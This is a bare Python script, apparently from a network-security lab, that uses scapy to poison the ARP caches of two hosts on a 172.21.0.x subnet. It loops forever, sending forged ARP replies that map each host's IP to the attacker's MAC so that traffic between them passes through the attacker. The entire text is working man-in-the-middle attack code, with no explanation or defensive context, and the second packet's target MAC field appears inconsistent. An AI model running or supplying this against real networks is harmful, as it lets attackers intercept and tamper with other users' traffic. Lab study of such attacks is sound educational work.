#!/usr/bin/python3
from scapy.all import *

HOSTA_IP = "172.21.0.4"
HOSTA_MAC = "02:42:ac:15:00:04"
HOSTB_IP = "172.21.0.2"
HOSTB_MAC = "02:42:ac:15:00:02"
ATTACKER_IP = "172.21.0.5"
ATTACKER_MAC = "02:42:ac:15:00:05"

ethA = Ether(src=ATTACKER_MAC, dst=HOSTA_MAC)
arpA = ARP(
        hwsrc=ATTACKER_MAC, psrc=HOSTB_IP,
        hwdst=HOSTA_MAC, pdst=HOSTA_IP,
        op=2   # 1 for ARP request; 2 for ARP reply
        )

ethB = Ether(src=ATTACKER_MAC, dst=HOSTB_MAC)
arpB = ARP(
        hwsrc=ATTACKER_MAC, psrc=HOSTA_IP,
        hwdst=HOSTA_MAC, pdst=HOSTB_IP,
        op=2   # 1 for ARP request; 2 for ARP reply
        )

while True:
    pktA = ethA/arpA
    sendp(pktA, count=1)
    pktB = ethB/arpB
    sendp(pktB, count=1)
    time.sleep(5)